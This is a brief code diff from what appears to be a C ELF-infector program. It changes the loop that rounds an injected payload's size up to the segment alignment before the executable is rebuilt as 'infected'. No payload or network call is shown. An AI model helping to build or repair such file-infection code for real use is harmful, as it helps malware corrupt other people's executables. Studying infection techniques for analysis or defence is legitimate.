@@ -68,7 +68,7 @@ int main(int argc, char *argv[]){
   //find the nearest power of 8 that will hold the payload
   size_t alignedPayloadSize;
   size_t alignment = programHeader->p_align;
-  for(alignedPayloadSize=alignment; alignedPayloadSize < payloadSize; alignedPayloadSize*=alignment){}
+  for(alignedPayloadSize=alignment; alignedPayloadSize < payloadSize; alignedPayloadSize+=alignment){}
 
   //allocate space for the new program header table and the payload
   infectedSize = targetSize + alignedPayloadSize;
